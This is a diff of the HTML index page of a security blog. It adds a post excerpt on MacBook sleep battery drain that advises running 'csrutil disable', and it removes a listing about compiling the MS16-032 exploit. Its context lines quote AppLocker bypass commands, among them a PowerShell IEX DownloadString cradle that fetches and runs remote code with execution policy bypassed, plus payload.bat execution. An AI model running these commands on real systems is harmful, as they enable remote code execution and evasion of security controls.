@@ -397,6 +397,180 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/osx10-11_weak_up_fix.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+      <meta itemprop="name" content="Evi1cg">
+      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+      <meta itemprop="name" content="Evi1cg's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/archives/osx10-11_weak_up_fix.html" class="post-title-link" itemprop="url">15版 osx10.11 El Capitan盒盖耗电解决方案</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2016-10-03 05:46:00" itemprop="dateCreated datePublished" datetime="2016-10-03T05:46:00+08:00">2016-10-03</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/随便写写/" itemprop="url" rel="index"><span itemprop="name">随便写写</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>15版的macbook pro 更新El Capitan之后,每天电脑盒盖之后还耗费了挺多电，差不多一晚平均3%-5%，一直再想办法解决，也查看了好多方式，一直没有什么效果，经过多次尝试，终于解决了。妈妈再也不用担心电脑继续耗电了。所以现在分享一下这个方法。</p>
+<p>首先可以查看一下是什么在唤醒电脑：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syslog <span class="string">| grep -i "</span>wake reason<span class="string">"</span></span><br></pre></td></tr></table></figure></p>
+<p>我的电脑晚上老是被 RTC (Alarm) 唤醒，差不多两小时一次。该怎么解决呢？ 很简单。</p>
+<p>首先重启电脑进入Recovery。<br><code>再重启听到开机的那个声音的时候，按住comman+R 直到苹果的图标出现</code>。</p>
+<p>之后找到终端，然后输入以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrutil <span class="built_in">disable</span></span><br></pre></td></tr></table></figure></p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/archives/osx10-11_weak_up_fix.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    <div>
+    
+    </div>
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+
+  
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/ypassing_Applocker_with_MSBuild-exe.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
@@ -675,7 +849,7 @@
 <h2 id="0x00-Command-和-Powershell-没被禁用，脚本被禁用"><a href="#0x00-Command-和-Powershell-没被禁用，脚本被禁用" class="headerlink" title="0x00 Command 和 Powershell 没被禁用，脚本被禁用"></a>0x00 Command 和 Powershell 没被禁用，脚本被禁用</h2><p><img src="https://evi1cg.github.io/usr/uploads/2016/12/1846475534.png" alt="1463634732723.png"></p>
 <h3 id="1、直接使用cmd-powershell执行"><a href="#1、直接使用cmd-powershell执行" class="headerlink" title="1、直接使用cmd powershell执行"></a>1、直接使用cmd powershell执行</h3><p>Powershell:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">IEX</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">'http://ip:port/'</span>)</span><br></pre></td></tr></table></figure></p>
 <p>Command：<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -<span class="built_in">exec</span> bypass -c IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString('http:<span class="comment">//ip:port/')</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="2、管道"><a href="#2、管道" class="headerlink" title="2、管道"></a>2、管道</h3><p>Powershell:<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> script.ps1 | iex</span><br></pre></td></tr></table></figure></p>
+<h3 id="2、管道"><a href="#2、管道" class="headerlink" title="2、管道"></a>2、管道</h3><p>Powershell:<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Content script.ps1 <span class="string">| iex</span></span><br></pre></td></tr></table></figure></p>
 <p>Command：<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span>.<span class="bash">exe /K &lt; payload.bat</span></span><br></pre></td></tr></table></figure></p>
           <!--noindex-->
           
@@ -1078,183 +1252,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/Compile_Your_Powreshell_Script.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
-      <meta itemprop="name" content="Evi1cg">
-      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
-      <meta itemprop="name" content="Evi1cg's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/archives/Compile_Your_Powreshell_Script.html" class="post-title-link" itemprop="url">编译你的Powershell( MS16-032为例)</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2016-06-30 05:20:00" itemprop="dateCreated datePublished" datetime="2016-06-30T05:20:00+08:00">2016-06-30</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/渗透案例/" itemprop="url" rel="index"><span itemprop="name">渗透案例</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>
-              授人以鱼不如授人以渔
-之前的MS16-032是个powershell脚本，怎么样改成exe呢，很简单。使用.net直接简单的修改编译就可以了。已经改好的代码在这里：
-戳我
-gist貌似被墙了，我在这里也贴一下：/*Author: Evilc
-              ...
-            </p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/archives/Compile_Your_Powreshell_Script.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    <div>
-    
-    </div>
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-
-  
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1305,7 +1302,7 @@ gist貌似被墙了，我在这里也贴一下：/*Author: Evilc
                 
                   <a href="/archive">
                 
-                    <span class="site-state-item-count">102</span>
+                    <span class="site-state-item-count">103</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
